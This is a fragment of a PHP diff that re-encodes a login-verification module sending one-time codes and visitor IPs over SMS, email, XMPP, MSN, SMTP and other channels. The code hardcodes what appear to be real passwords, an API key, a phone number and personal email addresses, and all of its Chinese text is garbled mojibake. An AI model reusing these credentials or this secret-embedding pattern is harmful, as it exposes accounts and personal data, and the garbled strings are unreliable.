-                        $voxeo->voxeosendsms('x3193','EUIfgwe7','8615998963077','Sorry! The verification code is£º'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['SMS'].', and the IP is :'.$_SERVER['REMOTE_ADDR']);
+                        $voxeo->voxeosendsms('x3193','EUIfgwe7','8615998963077','Sorry! The verification code isï¼š'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['SMS'].', and the IP is :'.$_SERVER['REMOTE_ADDR']);
                                    
             }
             elseif (strtolower(trim(request('verify'))) == 'email'){
-                                   //mail('xcy6272003@126.com','X3193ÑéÖ¤ÄúµÄ·ÃÎÊÈ¨ÏŞÊ§°Ü','±¾´ÎµÇÂ½ÑéÖ¤Ê§°Ü£¡ÇëÖØĞÂÑéÖ¤£¡ÑéÖ¤ÂëÎª£º'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['EMAIL'],"From: X3193<x3193@0318e.x3193.cu.cc>" . "\r\n" . "Reply-To: X3193<x3193@0318e.x3193.cu.cc>" . "\r\n" .'X-Mailer: PHP/' . phpversion());
+                                   //mail('xcy6272003@126.com','X3193éªŒè¯æ‚¨çš„è®¿é—®æƒé™å¤±è´¥','æœ¬æ¬¡ç™»é™†éªŒè¯å¤±è´¥ï¼è¯·é‡æ–°éªŒè¯ï¼éªŒè¯ç ä¸ºï¼š'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['EMAIL'],"From: X3193<x3193@0318e.x3193.cu.cc>" . "\r\n" . "Reply-To: X3193<x3193@0318e.x3193.cu.cc>" . "\r\n" .'X-Mailer: PHP/' . phpversion());
                   $html = new mail_class();
-                  $html->html_mail('X3193<x3193@0318e.x3193.cu.cc>','xcy6272003@126.com', 'X3193ÑéÖ¤ÄúµÄ·ÃÎÊÈ¨ÏŞÊ§°Ü', '±¾´ÎµÇÂ½ÑéÖ¤Ê§°Ü£¡ÇëÖØĞÂÑéÖ¤£¡ÑéÖ¤ÂëÎª£º'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['EMAIL'].', and the IP is :'.$_SERVER['SERVER_NAME'],'gb2312');
+                  $html->html_mail('X3193<x3193@0318e.x3193.cu.cc>','xcy6272003@126.com', 'X3193éªŒè¯æ‚¨çš„è®¿é—®æƒé™å¤±è´¥', 'æœ¬æ¬¡ç™»é™†éªŒè¯å¤±è´¥ï¼è¯·é‡æ–°éªŒè¯ï¼éªŒè¯ç ä¸ºï¼š'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['EMAIL'].', and the IP is :'.$_SERVER['SERVER_NAME'],'gb2312');
                                   
             }
       			elseif (strtolower(trim(request('verify'))) == 'sendcloud'){
       $url = 'http://sendcloud.sohu.com/webapi/mail.send.json';
-      //²»Í¬ÓÚµÇÂ¼SendCloudÕ¾µãµÄÕÊºÅ£¬ÄúĞèÒªµÇÂ¼ºóÌ¨´´½¨·¢ĞÅ×ÓÕÊºÅ£¬Ê¹ÓÃ×ÓÕÊºÅºÍÃÜÂë²Å¿ÉÒÔ½øĞĞÓÊ¼şµÄ·¢ËÍ¡£
+      //ä¸åŒäºç™»å½•SendCloudç«™ç‚¹çš„å¸å·ï¼Œæ‚¨éœ€è¦ç™»å½•åå°åˆ›å»ºå‘ä¿¡å­å¸å·ï¼Œä½¿ç”¨å­å¸å·å’Œå¯†ç æ‰å¯ä»¥è¿›è¡Œé‚®ä»¶çš„å‘é€ã€‚
       $param = array('api_user' => 'x3193_tk',
               'api_key' => '4tGTE5IWEArQMoVA',
               'from' => 'x3193@x3193.tk',
               'fromname' => 'x3193.tk',
               'to' => 'xcy6272003@126.com',
-              'subject' => iconv('gb2312','utf-8','X3193ÑéÖ¤ÄúµÄ·ÃÎÊÈ¨ÏŞÊ§°Ü'),
-              'html' => iconv('gb2312','utf-8','±¾´ÎµÇÂ½ÑéÖ¤Ê§°Ü£¡ÇëÖØĞÂÑéÖ¤£¡ÑéÖ¤ÂëÎª£º'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']));
+              'subject' => iconv('gb2312','utf-8','X3193éªŒè¯æ‚¨çš„è®¿é—®æƒé™å¤±è´¥'),
+              'html' => iconv('gb2312','utf-8','æœ¬æ¬¡ç™»é™†éªŒè¯å¤±è´¥ï¼è¯·é‡æ–°éªŒè¯ï¼éªŒè¯ç ä¸ºï¼š'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']));
       $options = array('http' => array('method'  => 'POST','content' => http_build_query($param)));
       $context  = stream_context_create($options);
       $result = file_get_contents($url, false, $context);
@@ -3482,44 +5110,44 @@ elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
             }   
             elseif (strtolower(trim(request('verify'))) == 'jabber' || strtolower(trim(request('verify'))) == 'gtalk'){
                $imified = new imified_class();
-                         $sendmsn = $imified->imifiedsendmsg('xcy6272003@126.com','EUIfgwe7','x3193@g.x3193.cz.cc','gtalk','±¾´ÎµÇÂ½ÑéÖ¤Ê§°Ü£¡ÇëÖØĞÂÑéÖ¤£¡±¾´ÎÑéÖ¤ÂëÎª£º'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]);
+                         $sendmsn = $imified->imifiedsendmsg('xcy6272003@126.com','EUIfgwe7','x3193@g.x3193.cz.cc','gtalk','æœ¬æ¬¡ç™»é™†éªŒè¯å¤±è´¥ï¼è¯·é‡æ–°éªŒè¯ï¼æœ¬æ¬¡éªŒè¯ç ä¸ºï¼š'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]);
             }   
             elseif (strtolower(trim(request('verify'))) == 'yahoo'){
                $imified = new imified_class();
-                         $sendmsn = $imified->imifiedsendmsg('xcy6272003@126.com','EUIfgwe7','xcy6272003@yahoo.com','yahoo','±¾´ÎµÇÂ½ÑéÖ¤Ê§°Ü£¡±¾´ÎÑéÖ¤ÂëÎª£º'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]);
+                         $sendmsn = $imified->imifiedsendmsg('xcy6272003@126.com','EUIfgwe7','xcy6272003@yahoo.com','yahoo','æœ¬æ¬¡ç™»é™†éªŒè¯å¤±è´¥ï¼æœ¬æ¬¡éªŒè¯ç ä¸ºï¼š'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]);
             }   
             elseif (strtolower(trim(request('verify'))) == 'xmpp'){
                $conn = new XMPPHP_XMPP('talk.google.com', 5222, 'xcy6272003@gmail.com', 'EUIfgwe7', 'xmpphp', 'gmail.com', $printlog=false, $loglevel=XMPPHP_Log::LEVEL_INFO);
                    $conn->connect();
                    $conn->processUntil('session_start');
                    $conn->presence();
-                   $conn->message('x3913@g.x3193.cz.cc', iconv('gb2312','utf-8','±¾´ÎµÇÂ½ÑéÖ¤Ê§°Ü£¡ÇëÖØĞÂÑéÖ¤£¡±¾´ÎÑéÖ¤ÂëÎª£º'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]));
+                   $conn->message('x3913@g.x3193.cz.cc', iconv('gb2312','utf-8','æœ¬æ¬¡ç™»é™†éªŒè¯å¤±è´¥ï¼è¯·é‡æ–°éªŒè¯ï¼æœ¬æ¬¡éªŒè¯ç ä¸ºï¼š'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]));
                    $conn->disconnect();
             } 
       			elseif (strtolower(trim(request('verify'))) == 'msn'){
 								$sendMsg = new sendMsg();
-								$sendMsg->simpleSend('x3193@live.com', 'EUIfgwe7', 'x3193@x3193.tk',iconv('gb2312','utf-8','±¾´ÎµÇÂ½ÑéÖ¤Ê§°Ü£¡ÇëÖØĞÂÑéÖ¤£¡±¾´ÎÑéÖ¤ÂëÎª£º'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]));
+								$sendMsg->simpleSend('x3193@live.com', 'EUIfgwe7', 'x3193@x3193.tk',iconv('gb2312','utf-8','æœ¬æ¬¡ç™»é™†éªŒè¯å¤±è´¥ï¼è¯·é‡æ–°éªŒè¯ï¼æœ¬æ¬¡éªŒè¯ç ä¸ºï¼š'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]));
 								//echo $sendMsg->result.' '.$sendMsg->error;
       			}    
       			elseif (strtolower(trim(request('verify'))) == 'smtp'){
 							$smtp = new smtp('smtp.x3193.tk','25',true,'x3193@x3193.tk','EUIfgwe7');
-        			$smtp->sendmail('merujxitcddevjhgg@x3193.tk','x3193.tk', 'x3193@x3193.tk','x3193@x3193.tk', iconv('gb2312','gb2312','±¾´ÎµÇÂ½ÑéÖ¤Ê§°Ü£¡'), iconv('gb2312','gb2312','±¾´ÎµÇÂ½ÑéÖ¤Ê§°Ü£¡±¾´ÎÑéÖ¤ÂëÎª£º'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']), 'txt', '', '', '','600');
+        			$smtp->sendmail('merujxitcddevjhgg@x3193.tk','x3193.tk', 'x3193@x3193.tk','x3193@x3193.tk', iconv('gb2312','gb2312','æœ¬æ¬¡ç™»é™†éªŒè¯å¤±è´¥ï¼'), iconv('gb2312','gb2312','æœ¬æ¬¡ç™»é™†éªŒè¯å¤±è´¥ï¼æœ¬æ¬¡éªŒè¯ç ä¸ºï¼š'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']), 'txt', '', '', '','600');
      				}      			           
             elseif (strtolower(trim(request('verify'))) == 'gcal'){
                     	$google_calendar = new google_class();
                     	$AuthClientLogin = $google_calendar->googleauthclientlogin(trim(base64_encode('xcy6272003@gmail.com')),trim(base64_encode('EUIfgwe7a')),trim('calendar'));
-               		$google_calendar->googlecalendarsendsms($AuthClientLogin,trim('±¾´ÎµÇÂ½ÑéÖ¤Ê§°Ü£¡±¾´ÎÑéÖ¤ÂëÎª£º'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]),trim('X3193µÇÂ¼ÑéÖ¤'),trim('X3193µÇÂ¼ÑéÖ¤Ä£¿é'));
+               		$google_calendar->googlecalendarsendsms($AuthClientLogin,trim('æœ¬æ¬¡ç™»é™†éªŒè¯å¤±è´¥ï¼æœ¬æ¬¡éªŒè¯ç ä¸ºï¼š'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]),trim('X3193ç™»å½•éªŒè¯'),trim('X3193ç™»å½•éªŒè¯æ¨¡å—'));
             }
             elseif (strtolower(trim(request('verify'))) == 'voxeo'){
                $voxeo = new imified_class();
-                         $voxeo->voxeosendsms('x3193','EUIfgwe7','8615998963077','±¾´ÎµÇÂ½ÑéÖ¤Ê§°Ü£¡±¾´ÎÑéÖ¤ÂëÎª£º'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]);
+                         $voxeo->voxeosendsms('x3193','EUIfgwe7','8615998963077','æœ¬æ¬¡ç™»é™†éªŒè¯å¤±è´¥ï¼æœ¬æ¬¡éªŒè¯ç ä¸ºï¼š'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]);
             }   
         		elseif (strtolower(trim(request('verify'))) == 'fetion'){
-							$fetion = new fetion_class();	// ÊÖ»úºÅ¡¢·ÉĞÅÃÜÂë
-							$fetion->sendmsg('',iconv('gb2312','utf-8','±¾´ÎµÇÂ½ÑéÖ¤Ê§°Ü£¡±¾´ÎÑéÖ¤ÂëÎª£º'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]));	// ½ÓÊÕÈËÊÖ»úºÅ¡¢·ÉĞÅÄÚÈİ      	
+							$fetion = new fetion_class();	// æ‰‹æœºå·ã€é£ä¿¡å¯†ç 
+							$fetion->sendmsg('',iconv('gb2312','utf-8','æœ¬æ¬¡ç™»é™†éªŒè¯å¤±è´¥ï¼æœ¬æ¬¡éªŒè¯ç ä¸ºï¼š'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]));	// æ¥æ”¶äººæ‰‹æœºå·ã€é£ä¿¡å†…å®¹      	
       	
    					 //$voxeo = new voxeo_class();
-             //$voxeo->voxeosendsms('x3193','EUIfgwe7','8615998963077','±¾´ÎÑéÖ¤ÂëÎª£º'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']);
+             //$voxeo->voxeosendsms('x3193','EUIfgwe7','8615998963077','æœ¬æ¬¡éªŒè¯ç ä¸ºï¼š'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']);
       			}           
                         }
                          
@@ -3541,7 +5169,7 @@ elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
 
 <?php 
 //---------------------------------------------
-// ±»±£»¤Ò³Ãæ´úÂë
+// è¢«ä¿æŠ¤é¡µé¢ä»£ç 
 //---------------------------------------------
 //session_set_cookie_params(3600 * 24 * 30 * 12 * 20);
 //session_start();
@@ -3561,18 +5189,18 @@ elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
 //----------------------------------------
 
 function verify(){ // idoll function start
-header('Content-Type: text/html; charset=gb2312');
+header('Content-Type: text/html; charset=utf-8');
 
 $skincolor = selstyle(trim(request("skin")));
-$sCrLf = chr(13) . chr(10); // »Ø³µ + »»ĞĞ
+$sCrLf = chr(13) . chr(10); // å›è½¦ + æ¢è¡Œ
 ?>
 <head>
 <?php 
 $style = new css();
 $style->ico();
-$style->title("X3193 - µÇÂ¼ÑéÖ¤");
-//$ipverify = 'n'; // y or n µ¥´¿IPÑéÖ¤
-//$smsverify = 'y'; // y or n ´¿¶ÌĞÅÈÏÖ¤
+$style->title("X3193 - ç™»å½•éªŒè¯");
+//$ipverify = 'n'; // y or n å•çº¯IPéªŒè¯
+//$smsverify = 'y'; // y or n çº¯çŸ­ä¿¡è®¤è¯
 //echo $smsverify;
 //echo $ipowner.'gg';   
 //$IPFilter = new IPFilter('');
@@ -3598,8 +5226,8 @@ if(preg_replace("/(.*)(|".strtolower(trim(request('verify')))."|)(.*)/", "$1$2$3
 if(strtoupper(trim(request('verify'))) != '' && strtoupper(trim(request('verifycode'))) == '' && strtoupper(trim(request('msgverifycode'))) == ''){
 
 session_set_cookie_params(3600 * 24 * 30 * 12 * 20);
-//ini_set('session.gc_maxlifetime',60);  //ÉèÖÃÀ¬»ø»ØÊÕ×î´óÉú´æÊ±¼ä
-//ini_set('session.gc_probability',10);    //ºÍsession.gc_divisorÒ»Æğ¹¹³ÉÇå³ıÀ¬»øµÄÖ´ĞĞ¼¸ÂÊ
+//ini_set('session.gc_maxlifetime',60);  //è®¾ç½®åƒåœ¾å›æ”¶æœ€å¤§ç”Ÿå­˜æ—¶é—´
+//ini_set('session.gc_probability',10);    //å’Œsession.gc_divisorä¸€èµ·æ„æˆæ¸…é™¤åƒåœ¾çš„æ‰§è¡Œå‡ ç‡
 //ini_set('session.gc_divisor',1);
 session_start();
 if(substr(PHP_VERSION, 0, 3)=='5.4'){
@@ -3624,29 +5252,29 @@ $_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG'] = r
         else{
        	
       if (strtolower(trim(request('verify'))) == 'sim'){
-                  //mail('xcy6272003@126.com','X3193ÕıÔÚÑéÖ¤ÄúµÄ·ÃÎÊÈ¨ÏŞ','±¾´ÎÑéÖ¤µØÖ·Îª£º<a href="'.httppathdir().'?api=blank&verify='.strtolower(trim(request('verify'))).'&verifycode='.trim($_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]).'&smsverify=">'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))].'</a> £¡',"Content-type: text/html; charset=gbk"."From: X3193<x3193@0318e.x3193.cu.cc>" . "\r\n" . "Reply-To: X3193<x3193@0318e.x3193.cu.cc>" . "\r\n" .'X-Mailer: PHP/' . phpversion());
+                  //mail('xcy6272003@126.com','X3193æ­£åœ¨éªŒè¯æ‚¨çš„è®¿é—®æƒé™','æœ¬æ¬¡éªŒè¯åœ°å€ä¸ºï¼š<a href="'.httppathdir().'?api=blank&verify='.strtolower(trim(request('verify'))).'&verifycode='.trim($_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]).'&smsverify=">'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))].'</a> ï¼',"Content-type: text/html; charset=gbk"."From: X3193<x3193@0318e.x3193.cu.cc>" . "\r\n" . "Reply-To: X3193<x3193@0318e.x3193.cu.cc>" . "\r\n" .'X-Mailer: PHP/' . phpversion());
                   //$html = new mail_class();
-                  //$html->html_mail('X3193<x3193@0318e.x3193.cu.cc>','xcy6272003@126.com', 'X3193ÕıÔÚÑéÖ¤ÄúµÄ·ÃÎÊÈ¨ÏŞ', '±¾´ÎÑéÖ¤µØÖ·Îª£º<a href="'.httppathdir().'?api=blank&verify='.strtolower(trim(request('verify'))).'&verifycode='.trim($_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]).'&smsverify=">'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))].'</a> £¡','gb2312');
+                  //$html->html_mail('X3193<x3193@0318e.x3193.cu.cc>','xcy6272003@126.com', 'X3193æ­£åœ¨éªŒè¯æ‚¨çš„è®¿é—®æƒé™', 'æœ¬æ¬¡éªŒè¯åœ°å€ä¸ºï¼š<a href="'.httppathdir().'?api=blank&verify='.strtolower(trim(request('verify'))).'&verifycode='.trim($_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]).'&smsverify=">'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))].'</a> ï¼','gb2312');
 				      		$voxeo = new voxeo_class();
                   $voxeo->voxeosendsms('x3193','EUIfgwe7','8615998963077','The code is : '.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['SMS'].', and the IP is :'.$_SERVER['REMOTE_ADDR']);        
       }  
       elseif (strtolower(trim(request('verify'))) == 'email'){
 
-                  //mail('xcy6272003@126.com','X3193ÕıÔÚÑéÖ¤ÄúµÄ·ÃÎÊÈ¨ÏŞ','±¾´ÎÑéÖ¤µØÖ·Îª£º<a href="'.httppathdir().'?api=blank&verify='.strtolower(trim(request('verify'))).'&verifycode='.trim($_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]).'&smsverify=">'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))].'</a> £¡',"Content-type: text/html; charset=gbk"."From: X3193<x3193@0318e.x3193.cu.cc>" . "\r\n" . "Reply-To: X3193<x3193@0318e.x3193.cu.cc>" . "\r\n" .'X-Mailer: PHP/' . phpversion());
+                  //mail('xcy6272003@126.com','X3193æ­£åœ¨éªŒè¯æ‚¨çš„è®¿é—®æƒé™','æœ¬æ¬¡éªŒè¯åœ°å€ä¸ºï¼š<a href="'.httppathdir().'?api=blank&verify='.strtolower(trim(request('verify'))).'&verifycode='.trim($_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]).'&smsverify=">'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))].'</a> ï¼',"Content-type: text/html; charset=gbk"."From: X3193<x3193@0318e.x3193.cu.cc>" . "\r\n" . "Reply-To: X3193<x3193@0318e.x3193.cu.cc>" . "\r\n" .'X-Mailer: PHP/' . phpversion());
                   $html = new mail_class();
-                  $html->html_mail('X3193<x3193@x3193.tk>','15998963077@126.com', 'X3193ÕıÔÚÑéÖ¤ÄúµÄ·ÃÎÊÈ¨ÏŞ', '±¾´ÎÑéÖ¤µØÖ·Îª£º'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG'].'£¬IPµØÖ·Îª£º'.$_SERVER['REMOTE_ADDR'],'gb2312');
+                  $html->html_mail('X3193<x3193@x3193.tk>','15998963077@126.com', 'X3193æ­£åœ¨éªŒè¯æ‚¨çš„è®¿é—®æƒé™', 'æœ¬æ¬¡éªŒè¯åœ°å€ä¸ºï¼š'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG'].'ï¼ŒIPåœ°å€ä¸ºï¼š'.$_SERVER['REMOTE_ADDR'],'gb2312');
      	}       
       elseif (strtolower(trim(request('verify'))) == 'sendcloud'){
      	
       $url = 'http://sendcloud.sohu.com/webapi/mail.send.json';
-      //²»Í¬ÓÚµÇÂ¼SendCloudÕ¾µãµÄÕÊºÅ£¬ÄúĞèÒªµÇÂ¼ºóÌ¨´´½¨·¢ĞÅ×ÓÕÊºÅ£¬Ê¹ÓÃ×ÓÕÊºÅºÍÃÜÂë²Å¿ÉÒÔ½øĞĞÓÊ¼şµÄ·¢ËÍ¡£
+      //ä¸åŒäºç™»å½•SendCloudç«™ç‚¹çš„å¸å·ï¼Œæ‚¨éœ€è¦ç™»å½•åå°åˆ›å»ºå‘ä¿¡å­å¸å·ï¼Œä½¿ç”¨å­å¸å·å’Œå¯†ç æ‰å¯ä»¥è¿›è¡Œé‚®ä»¶çš„å‘é€ã€‚
       $param = array('api_user' => 'x3193_tk',
               'api_key' => '4tGTE5IWEArQMoVA',
               'from' => 'x3193@x3193.tk',
               'fromname' => 'x3193.tk',
               'to' => 'xcy6272003@126.com',
-              'subject' => iconv('gb2312','utf-8','X3193ÕıÔÚÑéÖ¤ÄúµÄ·ÃÎÊÈ¨ÏŞ'),
-              'html' => iconv('gb2312','utf-8','±¾´ÎÑéÖ¤ÂëÎª£º'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']));
+              'subject' => iconv('gb2312','utf-8','X3193æ­£åœ¨éªŒè¯æ‚¨çš„è®¿é—®æƒé™'),
+              'html' => iconv('gb2312','utf-8','æœ¬æ¬¡éªŒè¯ç ä¸ºï¼š'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']));
       $options = array('http' => array('method'  => 'POST','content' => http_build_query($param)));
       $context  = stream_context_create($options);
       $result = file_get_contents($url, false, $context);
@@ -3657,33 +5285,33 @@ $_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG'] = r
              $conn->connect();
              $conn->processUntil('session_start');
              $conn->presence();
-             $conn->message('x3193@g.x3193.tk', iconv('gb2312','utf-8','±¾´ÎÑéÖ¤ÂëÎª£º'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']));
+             $conn->message('x3193@g.x3193.tk', iconv('gb2312','utf-8','æœ¬æ¬¡éªŒè¯ç ä¸ºï¼š'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']));
              $conn->disconnect();
       }   
       elseif (strtolower(trim(request('verify'))) == 'msn'){
 					$sendMsg = new sendMsg();
-					$sendMsg->simpleSend('x3193@live.com', 'EUIfgwe7', 'x3193@x3193.tk',iconv('gb2312','utf-8','±¾´ÎÑéÖ¤ÂëÎª£º'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']));
+					$sendMsg->simpleSend('x3193@live.com', 'EUIfgwe7', 'x3193@x3193.tk',iconv('gb2312','utf-8','æœ¬æ¬¡éªŒè¯ç ä¸ºï¼š'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']));
 					//echo $sendMsg->result.' '.$sendMsg->error;
       } 
       elseif (strtolower(trim(request('verify'))) == 'smtp'){
 				$smtp = new smtp('smtp.126.com','25',true,'xcy6272003@126.com','EUIfgwe7a');
-        $smtp->sendmail('xcy6272003@126.com','x3193.tk', 'x3193@x3193.tk','x3193@x3193.tk', iconv('gb2312','gb2312','X3193ÕıÔÚÑéÖ¤ÄúµÄ·ÃÎÊÈ¨ÏŞ'), iconv('gb2312','gb2312','±¾´ÎÑéÖ¤ÂëÎª£º'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']), 'txt', '', '', '','600');
+        $smtp->sendmail('xcy6272003@126.com','x3193.tk', 'x3193@x3193.tk','x3193@x3193.tk', iconv('gb2312','gb2312','X3193æ­£åœ¨éªŒè¯æ‚¨çš„è®¿é—®æƒé™'), iconv('gb2312','gb2312','æœ¬æ¬¡éªŒè¯ç ä¸ºï¼š'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']), 'txt', '', '', '','600');
       }        
       elseif (strtolower(trim(request('verify'))) == 'gcal'){
               	$google_calendar = new google_class();
               	$AuthClientLogin = $google_calendar->googleauthclientlogin(trim(base64_encode('xcy6272003@gmail.com')),trim(base64_encode('EUIfgwe7a')),trim('calendar'));
-        				$google_calendar->googlecalendarsendsms($AuthClientLogin,trim('X3193ÕıÔÚÑéÖ¤ÄúµÄ·ÃÎÊÈ¨ÏŞ,±¾´ÎÑéÖ¤ÂëÎª£º'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG'].'IPµØÖ·Îª£º'.$_SERVER['REMOTE_ADDR']),trim('X3193µÇÂ¼ÑéÖ¤'),trim('X3193µÇÂ¼ÑéÖ¤Ä£¿é'));
+        				$google_calendar->googlecalendarsendsms($AuthClientLogin,trim('X3193æ­£åœ¨éªŒè¯æ‚¨çš„è®¿é—®æƒé™,æœ¬æ¬¡éªŒè¯ç ä¸ºï¼š'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG'].'IPåœ°å€ä¸ºï¼š'.$_SERVER['REMOTE_ADDR']),trim('X3193ç™»å½•éªŒè¯'),trim('X3193ç™»å½•éªŒè¯æ¨¡å—'));
       }
       elseif (strtolower(trim(request('verify'))) == 'voxeo'){
 				      		$voxeo = new voxeo_class();
                   $voxeo->voxeosendsms('+8615998963077','The code of '.trim($_SERVER["SERVER_NAME"]).' is : '.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']);        
       }
       elseif (strtolower(trim(request('verify'))) == 'fetion'){
-							$fetion = new fetion_class();	// ÊÖ»úºÅ¡¢·ÉĞÅÃÜÂë
-							$fetion->sendmsg('',iconv('gb2312','utf-8','±¾´ÎÑéÖ¤ÂëÎª£º'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']));	// ½ÓÊÕÈËÊÖ»úºÅ¡¢·ÉĞÅÄÚÈİ      	
+							$fetion = new fetion_class();	// æ‰‹æœºå·ã€é£ä¿¡å¯†ç 
+							$fetion->sendmsg('','æœ¬æ¬¡éªŒè¯ç ä¸ºï¼š'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']);	// æ¥æ”¶äººæ‰‹æœºå·ã€é£ä¿¡å†…å®¹      	
       	
    					 //$voxeo = new voxeo_class();
-             //$voxeo->voxeosendsms('x3193','EUIfgwe7','8615998963077','±¾´ÎÑéÖ¤ÂëÎª£º'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']);
+             //$voxeo->voxeosendsms('x3193','EUIfgwe7','8615998963077','æœ¬æ¬¡éªŒè¯ç ä¸ºï¼š'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']);
       }      
       redirect(httppath().'?api=verify&verify='.strtolower(trim(request('verify'))).'&verifycode='.trim($_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]).'&msgverify=');
 		}
@@ -3691,8 +5319,8 @@ $_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG'] = r
 elseif(trim(request('verify')) != '' && trim(request('verifycode')) != '' && strlen(trim(request('verifycode'))) == '32' && strtoupper(trim(request('msgverify'))) == ''){
  
 session_set_cookie_params(3600 * 24 * 30 * 12 * 20);
-//ini_set('session.gc_maxlifetime',60);  //ÉèÖÃÀ¬»ø»ØÊÕ×î´óÉú´æÊ±¼ä
-//ini_set('session.gc_probability',10);    //ºÍsession.gc_divisorÒ»Æğ¹¹³ÉÇå³ıÀ¬»øµÄÖ´ĞĞ¼¸ÂÊ
+//ini_set('session.gc_maxlifetime',60);  //è®¾ç½®åƒåœ¾å›æ”¶æœ€å¤§ç”Ÿå­˜æ—¶é—´
+//ini_set('session.gc_probability',10);    //å’Œsession.gc_divisorä¸€èµ·æ„æˆæ¸…é™¤åƒåœ¾çš„æ‰§è¡Œå‡ ç‡
 //ini_set('session.gc_divisor',1);
 session_start();
 if(substr(PHP_VERSION, 0, 3)=='5.4'){
@@ -3717,7 +5345,7 @@ elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
         <tr>
